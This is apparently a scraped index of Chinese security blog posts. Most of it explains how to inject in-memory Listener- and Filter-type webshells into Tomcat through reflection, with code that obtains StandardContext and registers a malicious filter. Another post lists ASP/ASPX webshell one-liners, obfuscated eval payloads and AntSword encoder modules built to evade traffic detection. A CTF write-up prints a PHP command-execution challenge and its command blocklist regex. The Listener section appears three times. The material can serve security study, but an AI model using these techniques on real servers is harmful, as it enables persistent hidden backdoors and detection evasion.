HttpSessionIdListener || t instanceof HttpSessionAttributeListener) { this.context.addApplicationEventListener(t); match = true; } if (t instanceof HttpSessionListener || t instanceof ServletContextListener \u0026\u0026 this.newServletContextListenerAllowed) { this.context.addApplicationLifecycleListener(t); match = true; } if (!match) { if (t instanceof ServletContextListener) { throw new IllegalArgumentException(sm.getString(\"applicationContext.addListener.iae.sclNotAllowed\", new Object[]{t.getClass().getName()})); } else { throw new IllegalArgumentException(sm.getString(\"applicationContext.addListener.iae.wrongType\", new Object[]{t.getClass().getName()})); } } } } 综上所述，Listener类型Webshell的实现步骤如下： 创建恶意Listener 将其添加到ApplicationEventListener中去 Listener的添加步骤要比前两种简单得多，优先级也是三者中最高的。 2.0.2 实现效果首先注入一个恶意的listener事件监听器 访问内存Webshell，一片空白说明注入成功 在任意路径下加上?mr6=xxx即可执行命令 ","date":"2020-08-08","objectID":"/posts/tomcat-memory-webshell-listener/:2:0","series":null,"tags":[],"title":"Tomcat内存Webshell解析之Listener型","uri":"/posts/tomcat-memory-webshell-listener/#listener"},{"categories":["技术文章"],"content":"\r2 ListenerListener：通过listener可以监听web服务器中某一个执行动作，并根据其要求作出相应的响应。 以ServletRequestListener为例，ServletRequestListener主要用于监听ServletRequest对象的创建和销毁,一个ServletRequest可以注册多个ServletRequestListener接口。 每次请求创建时调用requestInitialized()。 每次请求销毁时调用requestDestroyed()。 Listener主要分为以下三个大类： ServletContext监听 Session监听 Request监听 其中前两种都不适合作为内存Webshell，因为涉及到服务器的启动跟停止，或者是Session的建立跟销毁，目光就聚集到第三种对于请求的监听上面，其中最适合作为Webshell的要数ServletRequestListener，因为我们可以拿到每次请求的的事件：ServletRequestEvent，通过其中的getServletRequest()函数就可以拿到本次请求的request对象，从而加入我们的恶意逻辑 。 2.0.1 实现步骤在ServletContext中可以看到addListener方法，发现此方法在ApplicationContext实现 javax.servlet.ServletContext#addListener(java.lang.String) 跟进org.apache.catalina.core.ApplicationContext#addListener(java.lang.String)，发现调用了同类中的重载方法 跟进org.apache.catalina.core.ApplicationContext#addListener(T)，发现遇到了跟添加filter很相似的情况，在开始会先判断Tomcat当前的生命周期是否正确，否则就抛出异常。实际上最核心的代码是调用了 this.context.addApplicationEventListener(t)，所以我们只需要反射调用addApplicationEventListener既可达到我们的目的。 public void addListener(T t) { if (!this.context.getState().equals(LifecycleState.STARTING_PREP)) { throw new IllegalStateException(sm.getString(\"applicationContext.addListener.ise\", new Object[]{this.getContextPath()})); } else { boolean match = false; if (t instanceof ServletContextAttributeListener || t instanceof ServletRequestListener || t instanceof ServletRequestAttributeListener || t instanceof HttpSessionIdListener || t instanceof HttpSessionAttributeListener) { this.context.addApplicationEventListener(t); match = true; } if (t instanceof HttpSessionListener || t instanceof ServletContextListener \u0026\u0026 this.newServletContextListenerAllowed) { this.context.addApplicationLifecycleListener(t); match = true; } if (!match) { if (t instanceof ServletContextListener) { throw new IllegalArgumentException(sm.getString(\"applicationContext.addListener.iae.sclNotAllowed\", new Object[]{t.getClass().getName()})); } else { throw new IllegalArgumentException(sm.getString(\"applicationContext.addListener.iae.wrongType\", new Object[]{t.getClass().getName()})); } } } } 综上所述，Listener类型Webshell的实现步骤如下： 创建恶意Listener 将其添加到ApplicationEventListener中去 Listener的添加步骤要比前两种简单得多，优先级也是三者中最高的。 2.0.2 实现效果首先注入一个恶意的listener事件监听器 访问内存Webshell，一片空白说明注入成功 在任意路径下加上?mr6=xxx即可执行命令 ","date":"2020-08-08","objectID":"/posts/tomcat-memory-webshell-listener/:2:0","series":null,"tags":[],"title":"Tomcat内存Webshell解析之Listener型","uri":"/posts/tomcat-memory-webshell-listener/#实现步骤"},{"categories":["技术文章"],"content":"\r2 ListenerListener：通过listener可以监听web服务器中某一个执行动作，并根据其要求作出相应的响应。 以ServletRequestListener为例，ServletRequestListener主要用于监听ServletRequest对象的创建和销毁,一个ServletRequest可以注册多个ServletRequestListener接口。 每次请求创建时调用requestInitialized()。 每次请求销毁时调用requestDestroyed()。 Listener主要分为以下三个大类： ServletContext监听 Session监听 Request监听 其中前两种都不适合作为内存Webshell，因为涉及到服务器的启动跟停止，或者是Session的建立跟销毁，目光就聚集到第三种对于请求的监听上面，其中最适合作为Webshell的要数ServletRequestListener，因为我们可以拿到每次请求的的事件：ServletRequestEvent，通过其中的getServletRequest()函数就可以拿到本次请求的request对象，从而加入我们的恶意逻辑 。 2.0.1 实现步骤在ServletContext中可以看到addListener方法，发现此方法在ApplicationContext实现 javax.servlet.ServletContext#addListener(java.lang.String) 跟进org.apache.catalina.core.ApplicationContext#addListener(java.lang.String)，发现调用了同类中的重载方法 跟进org.apache.catalina.core.ApplicationContext#addListener(T)，发现遇到了跟添加filter很相似的情况，在开始会先判断Tomcat当前的生命周期是否正确，否则就抛出异常。实际上最核心的代码是调用了 this.context.addApplicationEventListener(t)，所以我们只需要反射调用addApplicationEventListener既可达到我们的目的。 public void addListener(T t) { if (!this.context.getState().equals(LifecycleState.STARTING_PREP)) { throw new IllegalStateException(sm.getString(\"applicationContext.addListener.ise\", new Object[]{this.getContextPath()})); } else { boolean match = false; if (t instanceof ServletContextAttributeListener || t instanceof ServletRequestListener || t instanceof ServletRequestAttributeListener || t instanceof HttpSessionIdListener || t instanceof HttpSessionAttributeListener) { this.context.addApplicationEventListener(t); match = true; } if (t instanceof HttpSessionListener || t instanceof ServletContextListener \u0026\u0026 this.newServletContextListenerAllowed) { this.context.addApplicationLifecycleListener(t); match = true; } if (!match) { if (t instanceof ServletContextListener) { throw new IllegalArgumentException(sm.getString(\"applicationContext.addListener.iae.sclNotAllowed\", new Object[]{t.getClass().getName()})); } else { throw new IllegalArgumentException(sm.getString(\"applicationContext.addListener.iae.wrongType\", new Object[]{t.getClass().getName()})); } } } } 综上所述，Listener类型Webshell的实现步骤如下： 创建恶意Listener 将其添加到ApplicationEventListener中去 Listener的添加步骤要比前两种简单得多，优先级也是三者中最高的。 2.0.2 实现效果首先注入一个恶意的listener事件监听器 访问内存Webshell，一片空白说明注入成功 在任意路径下加上?mr6=xxx即可执行命令 ","date":"2020-08-08","objectID":"/posts/tomcat-memory-webshell-listener/:2:0","series":null,"tags":[],"title":"Tomcat内存Webshell解析之Listener型","uri":"/posts/tomcat-memory-webshell-listener/#实现效果"},{"categories":["技术文章"],"content":"\r1 前言最近学习了一下基于Tomcat的内存Webshell https://scriptboy.cn/p/tomcat-filter-inject/ https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA https://xz.aliyun.com/t/7388 ","date":"2020-07-14","objectID":"/posts/tomcat-memory-webshell-filter/:1:0","series":null,"tags":["webshell"],"title":"Tomcat内存Webshell解析之Filter型","uri":"/posts/tomcat-memory-webshell-filter/#前言"},{"categories":["技术文章"],"content":"\r2 Filter生效流程首先我们看下正常的一个filter的注册流程是什么。 首先写一个filter，实现Filter接口。 package com.yzddmr6; import javax.servlet.*; import java.io.IOException; public class filterDemo implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { System.out.println(\"Filter初始化创建....\"); } @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { System.out.println(\"进行过滤操作......\"); // 放行 chain.doFilter(request, response); } @Override public void destroy() { } } 在web.xml中添加filter的配置 然后调试看一下堆栈信息，找到filterChain生效的过程 然后看看这个filterChain是怎么来的 查看org.apache.catalina.core.ApplicationFilterFactory#createFilterChain源代码 ... filterChain.setServlet(servlet); filterChain.setServletSupportsAsync(wrapper.isAsyncSupported()); StandardContext context = (StandardContext)wrapper.getParent(); FilterMap[] filterMaps = context.findFilterMaps(); if (filterMaps != null \u0026\u0026 filterMaps.length != 0) { DispatcherType dispatcher = (DispatcherType)request.getAttribute(\"org.apache.catalina.core.DISPATCHER_TYPE\"); String requestPath = null; Object attribute = request.getAttribute(\"org.apache.catalina.core.DISPATCHER_REQUEST_PATH\"); if (attribute != null) { requestPath = attribute.toString(); } String servletName = wrapper.getName(); int i; ApplicationFilterConfig filterConfig; for(i = 0; i \u003c filterMaps.length; ++i) { if (matchDispatcher(filterMaps[i], dispatcher) \u0026\u0026 matchFiltersURL(filterMaps[i], requestPath)) { filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName()); if (filterConfig != null) { filterChain.addFilter(filterConfig); } } } for(i = 0; i \u003c filterMaps.length; ++i) { if (matchDispatcher(filterMaps[i], dispatcher) \u0026\u0026 matchFiltersServlet(filterMaps[i], servletName)) { filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMaps[i].getFilterName()); if (filterConfig != null) { filterChain.addFilter(filterConfig); } } } return filterChain; } else { return filterChain; } } ... 到这里就要掰扯一下这三个的关系：filterConfig、filterMaps跟filterDefs ","date":"2020-07-14","objectID":"/posts/tomcat-memory-webshell-filter/:2:0","series":null,"tags":["webshell"],"title":"Tomcat内存Webshell解析之Filter型","uri":"/posts/tomcat-memory-webshell-filter/#filter生效流程"},{"categories":["技术文章"],"content":"\r2.1 filterConfig、filterMaps、filterDefs直接查看此时StandardContext的内容，我们会有一个更直观的了解 其中filterDefs存放了filter的定义，比如名称跟对应的类，对应web.xml中如下的内容 \u003cfilter\u003e \u003cfilter-name\u003efilterDemo\u003c/filter-name\u003e \u003cfilter-class\u003ecom.yzddmr6.filterDemo\u003c/filter-class\u003e \u003c/filter\u003e filterConfigs除了存放了filterDef还保存了当时的Context，从下面两幅图可以看到两个context是同一个东西 FilterMaps则对应了web.xml中配置的``，里面代表了各个filter之间的调用顺序。\r即对应web.xml中的如下内容 \u003cfilter-mapping\u003e \u003cfilter-name\u003efilterDemo\u003c/filter-name\u003e \u003curl-pattern\u003e/*\u003c/url-pattern\u003e \u003c/filter-mapping\u003e 都添加完之后， 调用doFilter ，进入过滤阶段。 附上宽字节安全的一张图，可以清楚的看到整个流程。 到这里，整个流程就已经很清楚了。我们只需要把恶意的filter通过反射动态注入到StandardContext下的filterDefs跟filterConfigs中，每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以让我们的内存马就可以一直驻留下去，直到Tomcat重启。 ","date":"2020-07-14","objectID":"/posts/tomcat-memory-webshell-filter/:2:1","series":null,"tags":["webshell"],"title":"Tomcat内存Webshell解析之Filter型","uri":"/posts/tomcat-memory-webshell-filter/#filterconfigfiltermapsfilterdefs"},{"categories":["技术文章"],"content":"\r3 什么是StandardContext从上面的流程我们可以看到很多操作都跟StandardContext这个东西有关，事实上不管添加Filter还是Servlet都离不开它，那么到底什么是StandardContext呢？ 在一个tomcat服务器的生命周期内可以会创建一个或多个StandardContext对象，StandardContext对象代表的是一个具体的工程项目，对应的可以是server.xml里的``标签或webapps文件夹下的某一个工程文件夹或war包，也可以对应于conf/Catalina/localhost文件夹下的任一个xml文件里的Context配置。 附上l1nk3r师傅的一张简洁明了的图 Tomcat中的对应的ServletContext实现是ApplicationContext。ServletContext实际上是ApplicationContextFacade对象，对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例，以此来获取操作Tomcat容器内部的一些信息，例如Servlet的注册等。 ServletContext主要是适配Servlet规范，StandardContext是tomcat的一种容器。当然两者存在相互对应的关系，通过StandardContext的getServletContext可以获取ServletContext的具体实现。 ","date":"2020-07-14","objectID":"/posts/tomcat-memory-webshell-filter/:3:0","series":null,"tags":["webshell"],"title":"Tomcat内存Webshell解析之Filter型","uri":"/posts/tomcat-memory-webshell-filter/#什么是standardcontext"},{"categories":["技术文章"],"content":"\r4 如何获取StandardContext","date":"2020-07-14","objectID":"/posts/tomcat-memory-webshell-filter/:4:0","series":null,"tags":["webshell"],"title":"Tomcat内存Webshell解析之Filter型","uri":"/posts/tomcat-memory-webshell-filter/#如何获取standardcontext"},{"categories":["技术文章"],"content":"\r4.1 由ServletContext转StandardContext如果可以获取到request对象的话可以用这种方法 ServletContext servletContext = request.getServletContext(); ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext; Field applicationContextField = ApplicationContextFacade.class.getDeclaredField(\"context\"); applicationContextField.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(applicationContextFacade); Field standardContextField = ApplicationContext.class.getDeclaredField(\"context\"); standardContextField.setAccessible(true); StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext); ","date":"2020-07-14","objectID":"/posts/tomcat-memory-webshell-filter/:4:1","series":null,"tags":["webshell"],"title":"Tomcat内存Webshell解析之Filter型","uri":"/posts/tomcat-memory-webshell-filter/#由servletcontext转standardcontext"},{"categories":["技术文章"],"content":"\r4.2 从线程中获取StandardContext如果没有request对象的话可以从当前线程中获取 https://zhuanlan.zhihu.com/p/114625962 org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader(); StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext(); ","date":"2020-07-14","objectID":"/posts/tomcat-memory-webshell-filter/:4:2","series":null,"tags":["webshell"],"title":"Tomcat内存Webshell解析之Filter型","uri":"/posts/tomcat-memory-webshell-filter/#从线程中获取standardcontext"},{"categories":["技术文章"],"content":"\r4.3 从Mbean中获取https://scriptboy.cn/p/tomcat-filter-inject/ MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer(); // 获取mbsInterceptor Field field = Class.forName(\"com.sun.jmx.mbeanserver.JmxMBeanServer\").getDeclaredField(\"mbsInterceptor\"); field.setAccessible(true); Object mbsInterceptor = field.get(mBeanServer); // 获取repository field = Class.forName(\"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor\").getDeclaredField(\"repository\"); field.setAccessible(true); Object repository = field.get(mbsInterceptor); // 获取domainTb field = Class.forName(\"com.sun.jmx.mbeanserver.Repository\").getDeclaredField(\"domainTb\"); field.setAccessible(true); HashMap\u003cString, Map\u003cString, NamedObject\u003e\u003e domainTb = (HashMap\u003cString,Map\u003cString,NamedObject\u003e\u003e)field.get(repository); // 获取domain NamedObject nonLoginAuthenticator = domainTb.get(\"Catalina\").get(\"context=/,host=localhost,name=NonLoginAuthenticator,type=Valve\"); field = Class.forName(\"com.sun.jmx.mbeanserver.NamedObject\").getDeclaredField(\"object\"); field.setAccessible(true); Object object = field.get(nonLoginAuthenticator); // 获取resource field = Class.forName(\"org.apache.tomcat.util.modeler.BaseModelMBean\").getDeclaredField(\"resource\"); field.setAccessible(true); Object resource = field.get(object); // 获取context field = Class.forName(\"org.apache.catalina.authenticator.AuthenticatorBase\").getDeclaredField(\"context\"); field.setAccessible(true); StandardContext standardContext = (StandardContext) field.get(resource); ","date":"2020-07-14","objectID":"/posts/tomcat-memory-webshell-filter/:4:3","series":null,"tags":["webshell"],"title":"Tomcat内存Webshell解析之Filter型","uri":"/posts/tomcat-memory-webshell-filter/#从mbean中获取"},{"categories":["技术文章"],"content":"\r5 注入filterfilter 的实现，需要分别实现三个接口 init 、doFilter 、destroy Filter filter = new Filter() { @Override public void init(FilterConfig arg0) throws ServletException { } @Override public void doFilter(ServletRequest arg0, ServletResponse arg1, FilterChain arg2) throws IOException, ServletException { xxxx } arg2.doFilter(arg0, arg1); } @Override public void destroy() { } }; 那么如何添加一个filter呢，我们可以看下ApplicationContext中addFilter这个方法。 org.apache.catalina.core.ApplicationContext#addFilter(java.lang.String, java.lang.String, javax.servlet.Filter) private Dynamic addFilter(String filterName, String filterClass, Filter filter) throws IllegalStateException { if (filterName != null \u0026\u0026 !filterName.equals(\"\")) { if (!this.context.getState().equals(LifecycleState.STARTING_PREP)) { throw new IllegalStateException(sm.getString(\"applicationContext.addFilter.ise\", new Object[]{this.getContextPath()})); } else { FilterDef filterDef = this.context.findFilterDef(filterName); if (filterDef == null) { filterDef = new FilterDef(); filterDef.setFilterName(filterName); this.context.addFilterDef(filterDef); } else if (filterDef.getFilterName() != null \u0026\u0026 filterDef.getFilterClass() != null) { return null; } if (filter == null) { filterDef.setFilterClass(filterClass); } else { filterDef.setFilterClass(filter.getClass().getName()); filterDef.setFilter(filter); } return new ApplicationFilterRegistration(filterDef, this.context); } } else { throw new IllegalArgumentException(sm.getString(\"applicationContext.invalidFilterName\", new Object[]{filterName})); } } 可以看到首先在判断tomcat的生命周期处于LifecycleState.STARTING_PREP状态后，会判断是否存在当前的filter，如果不存在则new一个FilterDef，设置filtername后调用addFilterDef进行添加。 这里就有不同的操作了，如果想要直接使用addFilter这个方法，就需要先用反射修改tomcat的生命周期，调用之后再把state改回去。threedr3am师傅在文章基于tomcat的内存 Webshell 无文件攻击技术采用的这种方法。 当然，我们在查看源码之后我们知道，addFilter的主要目的是为了addFilterDef，所以也可以直接通过反射自行添加FilterDef。l1nk3r师傅在基于Tomcat无文件Webshell研究里采用的是这种实现方式。 Filter filter = new filter(){恶意代码} FilterDef filterDef = new FilterDef(); filterDef.setFilterName(name); filterDef.setFilterClass(filter.getClass().getName()); filterDef.setFilter(filter); standardContext.addFilterDef(filterDef); 接下来是如何添加到filterMaps中去。 这里就又有不同的解决办法了：threedr3am师傅是利用filterRegistration.addMappingForUrlPatterns函数，我们来看下这个函数的内容。org.apache.catalina.core.ApplicationFilterRegistration#addMappingForUrlPatterns 这个函数会先为filterDef来new一个filterMap，然后在this.context.addFilterMap(filterMap)这一句中就把filterMap给添加到filterMaps中去了。而l1nk3r师傅则直接用反射实现了相应的功能。 在这里还有一个关键的函数org.apache.catalina.core.StandardContext#addFilterMapBefore， 看一下this.filterMaps.addBefore(filterMap);这一句干了什么 public void addBefore(FilterMap filterMap) { synchronized(this.lock) { FilterMap[] results = new FilterMap[this.array.length + 1]; System.arraycopy(this.array, 0, results, 0, this.insertPoint); System.arraycopy(this.array, this.insertPoint, results, this.insertPoint + 1, this.array.length - this.insertPoint); results[this.insertPoint] = filterMap; this.array = results; ++this.insertPoint; } } 也就是把新增的filterMap给放到数组里的第一个。 因为filter的生效是有优先级的，所以在有其他filter干扰的情况下，把我们的恶意filter放到filterMap的第一位可以提高我们的优先级。在这里threedr3am师傅是自己手动实现了一个增加到第一位的方法。 而实际上通过调用addFilterMapBefore就可以达到我们的目的。 接下来就是如何将 filter 添加到 filterConfigs 当中，通过构造函数实例化的时候把filterConfig传进去即可。 Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class); constructor.setAccessible(true); FilterConfig filterConfig = (FilterConfig) constructor.newInstance(standardContext, filterDef); filterConfigs.put(name, filterConfig); l1nk3r师傅的文章中还提到tomcat 7 与 tomcat 8 在 FilterDef 和 FilterMap 这两个类所属的包名不太一样。 tomcat 7: org.apache.catalina.deploy.FilterDef; org.apache.catalina.deploy.FilterMap; tomcat 8: org.apache.tomcat.util.descriptor.web.FilterDef; org.apache.tomcat.util.descriptor.web.FilterMap; ","date":"2020-07-14","objectID":"/posts/tomcat-memory-webshell-filter/:5:0","series":null,"tags":["webshell"],"title":"Tomcat内存Webshell解析之Filter型","uri":"/posts/tomcat-memory-webshell-filter/#注入filter"},{"categories":["技术文章"],"content":"\r6 最终效果首先访问一次内存webshell，触发注入filter。 然后在任意路径下加上?mr6=xxx即可触发后门，执行命令 ","date":"2020-07-14","objectID":"/posts/tomcat-memory-webshell-filter/:6:0","series":null,"tags":["webshell"],"title":"Tomcat内存Webshell解析之Filter型","uri":"/posts/tomcat-memory-webshell-filter/#最终效果"},{"categories":["技术文章"],"content":"\r1 前言今天谈一谈ASP/ASPX下的流量混淆姿势。 以执行Response.Write(\"yzddmr6\")为例。 ","date":"2020-05-01","objectID":"/posts/asp-aspx-encoders/:1:0","series":null,"tags":[],"title":"ASP/ASPX下的流量混淆","uri":"/posts/asp-aspx-encoders/#前言"},{"categories":["技术文章"],"content":"\r2 不带eval的普通编码方式","date":"2020-05-01","objectID":"/posts/asp-aspx-encoders/:2:0","series":null,"tags":[],"title":"ASP/ASPX下的流量混淆","uri":"/posts/asp-aspx-encoders/#不带eval的普通编码方式"},{"categories":["技术文章"],"content":"\r2.1 Unicode(asp/aspx)利用iis解析unicode的特性，我们可以像sql的bypass一样来用unicode编码绕过。 mr6=Response.Write(\"yzddmr6\") 蚁剑中aspx类型shell默认有unicode编码器，但是asp中没有，可以自己手动添加一份。 ","date":"2020-05-01","objectID":"/posts/asp-aspx-encoders/:2:1","series":null,"tags":[],"title":"ASP/ASPX下的流量混淆","uri":"/posts/asp-aspx-encoders/#unicodeaspaspx"},{"categories":["技术文章"],"content":"\r2.2 大小写(asp)asp对于大小写不敏感，所以可以对payload中的字符进行大小写变换。 mr6=REsponSe.WriTe(\"yzddmr6\") 要注意的是aspx对大小写敏感，改变大小写之后会500。 ","date":"2020-05-01","objectID":"/posts/asp-aspx-encoders/:2:2","series":null,"tags":[],"title":"ASP/ASPX下的流量混淆","uri":"/posts/asp-aspx-encoders/#大小写asp"},{"categories":["技术文章"],"content":"\r2.3 添加百分号(asp)熟悉sql注入bypass的同学应该知道，iis+asp允许在每个字符前加一个%，此处同理。 mr6=R%e%sp%o%n%se.w%ri%te(\"yzddmr6\") ","date":"2020-05-01","objectID":"/posts/asp-aspx-encoders/:2:3","series":null,"tags":[],"title":"ASP/ASPX下的流量混淆","uri":"/posts/asp-aspx-encoders/#添加百分号asp"},{"categories":["技术文章"],"content":"\r3 带eval的普通编码方式有eval的情况下，无非是找找字符串变换函数来回套娃。 ","date":"2020-05-01","objectID":"/posts/asp-aspx-encoders/:3:0","series":null,"tags":[],"title":"ASP/ASPX下的流量混淆","uri":"/posts/asp-aspx-encoders/#带eval的普通编码方式"},{"categories":["技术文章"],"content":"\r3.1 ASCII码(asp/aspx)asp下用chr函数+\u0026连接 mr6=eval(chr(82)%26chr(101)%26chr(115)%26chr(112)%26chr(111)%26chr(110)%26chr(115)%26chr(101)%26chr(46)%26chr(87)%26chr(114)%26chr(105)%26chr(116)%26chr(101)%26chr(40)%26chr(34)%26chr(121)%26chr(122)%26chr(100)%26chr(100)%26chr(109)%26chr(114)%26chr(54)%26chr(34)%26chr(41)) aspx下用String.fromCharCode+逗号连接 mr6=eval(String.fromCharCode(82,101,115,112,111,110,115,101,46,87,114,105,116,101,40,34,121,122,100,100,109,114,54,34,41),\"unsafe\") ","date":"2020-05-01","objectID":"/posts/asp-aspx-encoders/:3:1","series":null,"tags":[],"title":"ASP/ASPX下的流量混淆","uri":"/posts/asp-aspx-encoders/#ascii码aspaspx"},{"categories":["技术文章"],"content":"\r3.2 字符拆分(asp/aspx)asp下用\u0026连接字符串，demo同chr函数。 aspx用+或者concat函数连接字符串 mr6=eval('Respons'%2B'e.Write(\"yzddmr6\")',\"unsafe\") mr6=eval('Respons'.concat('e.Write(\"yzddmr6\")'),\"unsafe\") ","date":"2020-05-01","objectID":"/posts/asp-aspx-encoders/:3:2","series":null,"tags":[],"title":"ASP/ASPX下的流量混淆","uri":"/posts/asp-aspx-encoders/#字符拆分aspaspx"},{"categories":["技术文章"],"content":"\r3.3 Base64编码(aspx) mr6=eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(\"UmVzcG9uc2UuV3JpdGUoInl6ZGRtcjYiKTs=\")),\"unsafe\"); ","date":"2020-05-01","objectID":"/posts/asp-aspx-encoders/:3:3","series":null,"tags":[],"title":"ASP/ASPX下的流量混淆","uri":"/posts/asp-aspx-encoders/#base64编码aspx"},{"categories":["技术文章"],"content":"\r3.4 Url编码(asp)asp eval(unescape(\"%25%35%32%25%36%35%25%37%33%25%37%30%25%36%66%25%36%65%25%37%33%25%36%35%25%32%65%25%35%37%25%37%32%25%36%39%25%37%34%25%36%35%25%32%38%25%32%32%25%37%39%25%37%61%25%36%34%25%36%34%25%36%64%25%37%32%25%33%36%25%32%32%25%32%39\")) ","date":"2020-05-01","objectID":"/posts/asp-aspx-encoders/:3:4","series":null,"tags":[],"title":"ASP/ASPX下的流量混淆","uri":"/posts/asp-aspx-encoders/#url编码asp"},{"categories":["技术文章"],"content":"\r4 非常规shell下的编码以上都是针对于基础类型的shell的流量混淆方法，如果不在最外层再套娃一次的话还是很容易被识别，这里给出几个demo。 ","date":"2020-05-01","objectID":"/posts/asp-aspx-encoders/:4:0","series":null,"tags":[],"title":"ASP/ASPX下的流量混淆","uri":"/posts/asp-aspx-encoders/#非常规shell下的编码"},{"categories":["技术文章"],"content":"\r4.1 base64_bypass(aspx)shell \u003c%@ Page Language=\"Jscript\"%\u003e \u003c%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item[\"mr6\"])),\"unsafe\");%\u003e 可以按照https://yzddmr6.tk/posts/webshell-venom-aspx/ 这篇文章做一下免杀 base64_bypass编码器 // // aspx::base64_bypass 编码模块 // 把所有参数都进行base64编码 // author：yzddmr6 'use strict'; module.exports = (pwd, data, ext = null) =\u003e { let randomID; if (ext.opts.otherConf['use-random-variable'] === 1) { randomID = antSword.utils.RandomChoice(antSword['RANDOMWORDS']); } else { randomID = `${antSword['utils'].RandomLowercase()}${Math.random().toString(16).substr(2)}`; } data[randomID] = Buffer .from(data['_']) .toString('base64'); data[pwd] = Buffer.from(`eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item[\"${randomID}\"])),\"unsafe\");`).toString('base64'); delete data['_']; return data; } ","date":"2020-05-01","objectID":"/posts/asp-aspx-encoders/:4:1","series":null,"tags":[],"title":"ASP/ASPX下的流量混淆","uri":"/posts/asp-aspx-encoders/#base64_bypassaspx"},{"categories":["技术文章"],"content":"\r4.2 url_bypass(asp)shell \u003c%execute(unescape(request(\"mr6\")))%\u003e url_bypass编码器 /** * asp::url_bypass 编码器 * 双重url编码 * author: yzddmr6 * \u003c%execute(unescape(request(\"mr6\")))%\u003e */ 'use strict'; module.exports = (pwd, data) =\u003e { function str2url(str) { var ret = \"\"; for (var i = 0; i \u003c str.length; i++) { ret += \"%\"+str[i].charCodeAt().toString(16); } return ret; } data[pwd] = `asunescape(${str2url(str2url(data['_']))})`; delete data['_']; return data; } ","date":"2020-05-01","objectID":"/posts/asp-aspx-encoders/:4:2","series":null,"tags":[],"title":"ASP/ASPX下的流量混淆","uri":"/posts/asp-aspx-encoders/#url_bypassasp"},{"categories":["技术文章"],"content":"\r5 最后个人推荐的做法还是类似随机cookie编码器那种一次一密的做法，不过可能asp/aspx实现起来不像php那么方便，有空了研究一下。 上面所提到的编码方式可以相互套娃，效果可能更佳。 如果其他想法后面再补上，此贴长期更新。 ","date":"2020-05-01","objectID":"/posts/asp-aspx-encoders/:5:0","series":null,"tags":[],"title":"ASP/ASPX下的流量混淆","uri":"/posts/asp-aspx-encoders/#最后"},{"categories":["技术文章"],"content":"\r1 前言刷buuoj的时候遇到[安洵杯 2019]easy_web 这样一个题，做一半看到他这个正则写的有点问题，就去翻wp。 找到了官方的wp发现果然是个非预期。 但是官方wp中并没有深入说明。后来看到评论去翻出题人的博客也没找到相关的信息，加上看到了其他wp中一些不准确的说法，所以今天就有了这篇文章来讲一讲自己的看法。 ","date":"2020-04-12","objectID":"/posts/php-preg-tricks/:1:0","series":null,"tags":["CTF"],"title":"从一道CTF的非预期解看PHP反斜杠匹配问题","uri":"/posts/php-preg-tricks/#前言"},{"categories":["技术文章"],"content":"\r2 正文题目源码 \u003c?php error_reporting(E_ALL || ~ E_NOTICE); header('content-type:text/html;charset=utf-8'); $cmd = $_GET['cmd']; if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0\u0026cmd='); $file = hex2bin(base64_decode(base64_decode($_GET['img']))); $file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file); if (preg_match(\"/flag/i\", $file)) { echo '\u003cimg src =\"./ctf3.jpeg\"\u003e'; die(\"xixi～ no flag\"); } else { $txt = base64_encode(file_get_contents($file)); echo \"\u003cimg src='data:image/gif;base64,\" . $txt . \"'\u003e\u003c/img\u003e\"; echo \"\u003cbr\u003e\"; } echo $cmd; echo \"\u003cbr\u003e\"; if (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\\u0026[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|\u003c|\u003e/i\", $cmd)) { echo(\"forbid ~\"); echo \"\u003cbr\u003e\"; } else { if ((string)$_POST['a'] !== (string)$_POST['b'] \u0026\u0026 md5($_POST['a']) === md5($_POST['b'])) { echo `$cmd`; } else { echo (\"md5 is funny ~\"); } } 前面md5碰撞已经是老套路了，问题出在后面对shell命令的过滤上。 if (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\\u0026[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|\u003c|\u003e/i\", $cmd)) { echo(\"forbid ~\"); echo \"\u003cbr\u003e\"; } 熟悉php代码审计的同学应该都知道，在preg_match中要过滤\\ 是需要四个\\\\\\\\才可以达到目的，原理如下： $str = '\\/div'; $pattern = '/\\\\\\\\\\/div/'; // '\\\\\\\\\\/' 解析过程如下： // PHP解析： // 第1个'\\'转义第2个'\\'，转义后为字符串'\\' // 第3个'\\'转义第4个'\\'，转义后为字符串'\\' // 第5个'\\'转义'/'，转义后为字符串'/' // 字符合起来为'\\\\/' （则 \\\\/div 即为正则将要解析的内容，注意：正则解析的内容已经不包括正则标识符//） // 正则解析器解析： // 两个'\\\\' 正则表达式看做'\\' 